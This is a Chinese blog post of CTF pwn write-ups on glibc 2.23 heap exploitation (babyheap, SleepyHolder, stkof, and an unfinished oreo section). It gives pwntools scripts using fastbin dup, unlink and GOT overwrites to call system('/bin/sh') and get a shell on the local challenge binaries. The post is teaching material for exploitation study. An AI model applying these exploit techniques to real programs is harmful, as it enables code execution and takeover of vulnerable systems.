<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="py"><meta name="copyright" content="py"><meta name="generator" content="Hexo 7.3.0"><meta name="theme" content="hexo-theme-yun"><title>how2heap例题 | 我是py</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/favicon/favicon.ico"><link rel="mask-icon" href="/favicon/favicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"juryorca.github.io","root":"/","title":"宇宙终极无敌猫猫虫大王","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><meta name="description" content="libc2.230ctfbabyheap首先打开程序就知道分成几个部分。Allocate: 可以申请16个 由mmap分配了一个空间存储相应信息。结构如下:一个chunk由一个24字节的区域记录 ，前8个字节记录是否没被free，8-16记录大小，16-24记录地址并且每次申请都会用1初始化。Fill: 写入字节，但是存在一个很明显的溢出,必须输入指定字节数 否则不停止Free: 就是正常的fre">
<meta property="og:type" content="article">
<meta property="og:title" content="how2heap例题">
<meta property="og:url" content="http://juryorca.github.io/2025/07/10/how2heap%E4%BE%8B%E9%A2%98/index.html">
<meta property="og:site_name" content="我是py">
<meta property="og:description" content="libc2.230ctfbabyheap首先打开程序就知道分成几个部分。Allocate: 可以申请16个 由mmap分配了一个空间存储相应信息。结构如下:一个chunk由一个24字节的区域记录 ，前8个字节记录是否没被free，8-16记录大小，16-24记录地址并且每次申请都会用1初始化。Fill: 写入字节，但是存在一个很明显的溢出,必须输入指定字节数 否则不停止Free: 就是正常的fre">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-07-10T06:15:47.000Z">
<meta property="article:modified_time" content="2025-10-07T08:14:28.516Z">
<meta property="article:author" content="py">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="py"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="py"></a><div class="site-author-name"><a href="/about/">py</a></div><span class="site-name">我是py</span><sub class="site-subtitle">我是py</sub><div class="site-description">无敌奶龙大王cfy & cgxy和无敌疾旋鼬大王dcm</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">12</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">5</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/Juryorca" title="GitHub" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/i-wanna-41-50" title="知乎" target="_blank" style="color:#0084FF"><span class="icon iconify" data-icon="ri:zhihu-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="都是大佬stO" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#libc2-23"><span class="toc-number">1.</span> <span class="toc-text">libc2.23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0ctfbabyheap"><span class="toc-number">1.1.</span> <span class="toc-text">0ctfbabyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SleepyHolder"><span class="toc-number">1.2.</span> <span class="toc-text">SleepyHolder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stkof"><span class="toc-number">1.3.</span> <span class="toc-text">stkof</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#oreo"><span class="toc-number">1.3.1.</span> <span class="toc-text">oreo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookbook"><span class="toc-number">1.4.</span> <span class="toc-text">cookbook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zerostorage"><span class="toc-number">1.5.</span> <span class="toc-text">zerostorage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#heapstorm"><span class="toc-number">1.6.</span> <span class="toc-text">heapstorm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tinypad"><span class="toc-number">1.7.</span> <span class="toc-text">tinypad</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-orange"><span class="toc-number">1.8.</span> <span class="toc-text">house of orange</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text"></span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://Juryorca.github.io/2025/07/10/how2heap%E4%BE%8B%E9%A2%98/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="py"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="我是py"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">how2heap例题</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-07-10 14:15:47" itemprop="dateCreated datePublished" datetime="2025-07-10T14:15:47+08:00">2025-07-10</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2025-10-07 16:14:28" itemprop="dateModified" datetime="2025-10-07T16:14:28+08:00">2025-10-07</time></div><div class="post-classify"><span class="post-tag"><a class="tag-item" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pwn</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="libc2-23"><a href="#libc2-23" class="headerlink" title="libc2.23"></a>libc2.23</h1><h2 id="0ctfbabyheap"><a href="#0ctfbabyheap" class="headerlink" title="0ctfbabyheap"></a>0ctfbabyheap</h2><p>首先打开程序就知道分成几个部分。<br>Allocate: 可以申请16个 由mmap分配了一个空间存储相应信息。<br>结构如下:一个chunk由一个24字节的区域记录 ，前8个字节记录是否没被free，8-16记录大小，16-24记录地址<br>并且每次申请都会用1初始化。<br>Fill: 写入字节，但是存在一个很明显的溢出,必须输入指定字节数 否则不停止<br>Free: 就是正常的free.<br>Dump: 输出内容， 前面有Content: 的提示</p>
<p>这里就用最简单的fastbindup篡改malloc_hook的思路。</p>
<p>这里需要需要控制出一个重叠来泄露libc地址。<br>fastbin在free时并不会设置后一块的prev_in_use位，也就是说，进入fastbin几乎没有检查，这让我们可以构造出一个fastbin和small的重叠<br>我们通过两个fastbin的部分覆盖能轻松实现这个要求.<br>先写好四个基础操作的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./0ctfbabyheap&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Allocate</span>(<span class="params">num</span>):</span><br><span class="line">        p.sendline(<span class="string">f&quot;1\n<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fill</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.send(<span class="string">f&quot;2\n<span class="subst">&#123;index&#125;</span>\n<span class="subst">&#123;<span class="built_in">len</span>(data)&#125;</span>\n&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Free</span>(<span class="params">index</span>):</span><br><span class="line">        p.send(<span class="string">f&quot;3\n<span class="subst">&#123;index&#125;</span>\n&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dump</span>(<span class="params">index</span>):</span><br><span class="line">        p.send(<span class="string">f&quot;4\n<span class="subst">&#123;index&#125;</span>\n&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> p.recvline()</span><br></pre></td></tr></table></figure>

<p>构思流程:<br>先申请4个0x30大小的fastbin 两个用来重叠（这里用的是部分覆盖 因此还需要多增加一个chunk用来溢出,否则fd会是0） 最后一个用来防止合并<br>然后申请一个0x90大小的 用来获得main_arena地址。<br>申请完调试一下，看smallchunk位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55c9998f00c0</span><br><span class="line">Size: 0x90 (with flag bits: 0x91) </span><br></pre></td></tr></table></figure>

<p>我们先控制fastbindup 与 这个smallbin 重叠 .这里只需要相对覆盖，这里还需要注意的是需要先把size修改了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Allocate(<span class="number">0x90</span>-<span class="number">8</span>)</span><br><span class="line">Fill(<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>))</span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Free(<span class="number">2</span>)</span><br><span class="line">Fill(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x31</span>)+<span class="string">b&#x27;\xc0&#x27;</span>)</span><br><span class="line">Allocate(<span class="number">0x30</span>-<span class="number">8</span>)</span><br><span class="line">Allocate(<span class="number">0x30</span>-<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x55e92237b0c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br></pre></td></tr></table></figure>

<p>这就说明已经成功重叠了(这是新开了一次程序，看相对位置就行)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE 0 </span><br><span class="line">Addr: 0x55e92237b000</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE </span><br><span class="line">Addr: 0x55e92237b030</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE 1</span><br><span class="line">Addr: 0x55e92237b060</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE 3</span><br><span class="line">Addr: 0x55e92237b090</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE 4 2</span><br><span class="line">Addr: 0x55e92237b0c0</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后就是修改回原来的大小 free掉4 这里要再malloc一个0x90大小的chunk先，防止free的时候和topchunk合并</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fill(3,p64(0)*5+p64(0x91))</span><br><span class="line">Allocate(0x80)</span><br><span class="line">Free(4)</span><br></pre></td></tr></table></figure>

<p>输出检查一下<br>正常就继续<br>0x7d71b69c3b78 是给出的位置<br>算出libc位置<br>0x7d71b6600000<br>可计算出偏移0x3c3b78<br>mallochook的位置在3c3b10<br>我们分配到malloc_hook -8*2-3也就是-19的位置<br>这里要注意fastbin指针是从chunk起点开始的 我因为这个卡了很久。</p>
<h2 id="SleepyHolder"><a href="#SleepyHolder" class="headerlink" title="SleepyHolder"></a>SleepyHolder</h2><p>程序初始化部分设置了一个60秒的限时 到时间自动退出</p>
<ol>
<li>兼具申请和写入功能，申请大小无法自己设定，但是有largebin大小和fastbin大小，还有个非常大的大小。每个都只能申请一次，但largebin 和fastbin大小的可以free</li>
<li>free功能，free没有检查是否已经free，导致有double free的可能性</li>
<li>read功能，但是需要已经申请过。</li>
</ol>
<p>可以double free 但是free后没法写 这就非常符合fastbin_dup_consolidate 技术的使用前提。<br>但是还有个问题，我们无法通过chunk泄露出libc,不过还好这题没开PIE，这样可以考虑修改got表 然后操作三个<br>还有个问题就是修改got以及后续利用的方法，我原本想的是用puts来泄露里libc,然后搞ROP  但我后来觉得既然都修改got了，不如直接再修改free成system 然后运行system(‘&#x2F;bin&#x2F;sh’)</p>
<p>先写对应的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;3. Renew secret&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;What secret do you want to keep?&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Tell me your secret:&#x27;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">        p.recv(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;3. Renew secret&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;2. Big secret&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index,data</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;3. Renew secret&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;2. Big secret&#x27;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>))</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;Tell me your secret:&#x27;</span>)</span><br><span class="line">        p.send(data)</span><br><span class="line">        p.recv(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为了防止一些读写方面字符的差距，这里写的比较复杂。</p>
<p>先构造重叠。<br>这里由于只能用三个块，所以可以1号用来构造重叠，2号用来隔离防止合并，3当作一个largebin大小的申请把1移入unsorted bin </p>
<p>这些都是正常的，但是程序由于没有对double free的检查，并且fastbin也没有(不检查后一个chunk的prev_inuse)</p>
<p>这就导致我们可以再free一次1，使得smallbin和fastbin都有1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smallbins</span><br><span class="line">0x30 [corrupted]</span><br><span class="line">FD: 0x2714770 ◂— 0</span><br><span class="line">BK: 0x2714770 —▸ 0x7ccaf71c3b98 ◂— 0x2714770</span><br><span class="line"></span><br><span class="line">fastbins</span><br><span class="line">0x30: 0x2714770 ◂— 0</span><br></pre></td></tr></table></figure>

<p>这时候我们再申请 会先从fastbin里面取，然后就可以打unsortedbin attack 把这个堆块分配到1的指针位置<br>具体就不细说了.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(1,b&#x27;a&#x27;)</span><br><span class="line">add(2,b&#x27;a&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">add(3,b&#x27;a&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">ptr1=0x6020d0</span><br><span class="line">payload =p64(0)+p64(0x21)+ p64(ptr1 - 0x18) + p64(ptr1 - 0x10)+p64(0x20)</span><br><span class="line">add(1,payload)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里就成功打了个fastbin_dup_consolidate + unlink</p>
<p>ptr1会被成功修改成ptr1-0x18，我们看bss的结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:00000000006020B8 byte_6020B8     db ?                    ; DATA XREF: sub_4008F0↑r</span><br><span class="line">.bss:00000000006020B8                                         ; sub_4008F0+13↑w</span><br><span class="line">.bss:00000000006020B9                 align 20h</span><br><span class="line">.bss:00000000006020C0 ; void *buf2</span><br><span class="line">.bss:00000000006020C0 buf2            dq ?                    ; DATA XREF: Allocate_read+11E↑w</span><br><span class="line">.bss:00000000006020C0                                         ; Allocate_read+139↑r ...</span><br><span class="line">.bss:00000000006020C8 ; void *buf3</span><br><span class="line">.bss:00000000006020C8 buf3            dq ?                    ; DATA XREF: Allocate_read+174↑w</span><br><span class="line">.bss:00000000006020C8                                         ; Allocate_read+18F↑r</span><br><span class="line">.bss:00000000006020D0 ; void *buf1</span><br><span class="line">.bss:00000000006020D0 buf1            dq ?                    ; DATA XREF: Allocate_read+C2↑w</span><br><span class="line">.bss:00000000006020D0                                         ; Allocate_read+DD↑r ...</span><br><span class="line">.bss:00000000006020D8 dword_6020D8    dd ?                    ; DATA XREF: Allocate_read:loc_400A3D↑r</span><br><span class="line">.bss:00000000006020D8                                         ; Allocate_read+125↑w ...</span><br><span class="line">.bss:00000000006020DC locked          dd ?                    ; DATA XREF: Allocate_read+35↑r</span><br><span class="line">.bss:00000000006020DC                                         ; Allocate_read:loc_400A96↑r ...</span><br><span class="line">.bss:00000000006020E0 dword_6020E0    dd ?                    ; DATA XREF: Allocate_read:loc_4009E1↑r</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们目前可以控制三个的指针和两个free检查位 其中locked 和 buf3 没什么用 。<br>首先我们要泄露libc_base. buf1覆盖成free的got 这样再次覆盖的时候就可以修改free成其他的函数，我们稍后将它修改成puts.plt<br>再把buf2覆盖成任何一个got表，这里可以选择atoi<br>对于buf3,可以不用管。<br>这样覆盖一次后，再次覆盖就是在free的got覆盖了，把他覆盖成puts.plt 然后运行free(2)  (其实是puts(2))<br>然后就会输出atoi的got里面的值，也就是atoi在glibc里面的实际位置。<br>然后我们再次覆盖 把free写成system的地址， 这里要注意新建2 写入’&#x2F;bin&#x2F;sh’ 然后运行即可.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">atoi_got = <span class="number">0x602080</span></span><br><span class="line">puts_plt = <span class="number">0x400760</span></span><br><span class="line">atoi_offset = <span class="number">0x36E70</span></span><br><span class="line">system_offset = <span class="number">0x45380</span></span><br><span class="line">payload =p64(<span class="number">0</span>) + p64(atoi_got) + p64(<span class="number">0</span>) + p64(free_got) + p32(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">update(<span class="number">1</span>,payload)</span><br><span class="line">payload =p64(puts_plt)</span><br><span class="line">update(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>.from_bytes(p.recv(<span class="number">6</span>),<span class="string">&#x27;little&#x27;</span>)-atoi_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload = libc_base + system_offset</span><br><span class="line">update(<span class="number">1</span>,p64(payload))</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">add(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="stkof"><a href="#stkof" class="headerlink" title="stkof"></a>stkof</h2><p>有四个四个功能，申请部分直接暴露了存储堆ptr地址，写入部分存在溢出,free部分空置了指针，所以没有uaf，另外我们无法打印出指针。<br>我想到的方法其实和前面差不多？ 搜到的也基本是这么做的。这样看来前面那题反而更难</p>
<p>我的想法大致是 unlink1用来控制指针，然后2用来控制free.got变成puts.plt然后再把2重新覆盖成atoi.got用来泄露libc,接着继续重复操作覆盖成system，最后我们直接覆盖ptr-0x18的位置为&#x2F;bin&#x2F;sh 来运行system(&#x2F;bin&#x2F;sh)</p>
<p>先写三个操作函数 &#x2F;&#x2F;输出部分没什么用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=process(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size</span>):</span><br><span class="line">payload = <span class="string">b&#x27;1\n&#x27;</span>+<span class="built_in">str</span>(size).encode(<span class="string">&#x27;l1&#x27;</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,data</span>):</span><br><span class="line">payload = <span class="string">b&#x27;2\n&#x27;</span></span><br><span class="line">payload += <span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line">payload += <span class="built_in">str</span>(n).encode(<span class="string">&#x27;l1&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">payload +=data</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">payload = <span class="string">b&#x27;3\n&#x27;</span></span><br><span class="line">payload += <span class="built_in">str</span>(index).encode(<span class="string">&#x27;l1&#x27;</span>) + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>

<p>我先进行了unlink操作 结果测试的时候发现不对劲，我再malloc三次后检查了heap发现，程序由于输出主动申请了个缓冲区，所以我们的1号chunk没用了<br>unlink</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x88</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">new(<span class="number">0x88</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">new(<span class="number">0x88</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">new(<span class="number">0x88</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">ptr2 = <span class="number">0x602150</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>)+ p64(ptr2-<span class="number">0x18</span>) + p64(ptr2 - <span class="number">0x10</span>)  +(p64(<span class="number">0</span>)*<span class="number">2</span>)*<span class="number">6</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>为了方便后续操作  本来要在函数体内部处理的p.recvline()我都移到外面了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">atoi_got = <span class="number">0x602088</span></span><br><span class="line">puts_plt = <span class="number">0x400760</span></span><br><span class="line">atoi_offset = <span class="number">0x36E70</span></span><br><span class="line">system_offset = <span class="number">0x45380</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(ptr2)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = p64(ptr2)+p64(free_got)+p64(atoi_got)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>.from_bytes(p.recvline().rstrip(<span class="string">b&#x27;\n&#x27;</span>),<span class="string">&#x27;little&#x27;</span>) - atoi_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">p.recvline()</span><br><span class="line">payload = p64(libc_base+system_offset)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = p64(ptr2-<span class="number">0x10</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这一块的操作可以参考一下上一题，就不细说了，流程稍微优化了一下 比刚才讲的简单点，利用到了ptr3</p>
<h3 id="oreo"><a href="#oreo" class="headerlink" title="oreo"></a>oreo</h3><p>注意这一题是32位的<br>这个题题面比较复杂<br>Add new rifle:<br>一个rifle是一个结构体，大小56，如果加上head就是64<br>结构体大致如下</p>
<table>
<thead>
<tr>
<th>offset</th>
<th>label</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>description</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>25</td>
<td>name</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
</tr>
<tr>
<td>52</td>
<td>fd</td>
</tr>
</tbody></table>
<p>可以理解为一个链表，程序有一个变量记录表头 每次申请都往表头后插入 类似fastbin<br>还有个变量用于记录存储的所有rifles<br>但是很明显，Add new rifle过程存在堆溢出<br>每次读取都读取56个字符.</p>
<p>Show added rifles:<br>按单链表顺序，显示Name和Description</p>
<p>Order selected rifles:<br>free所有的rifles ，会把head归零。</p>
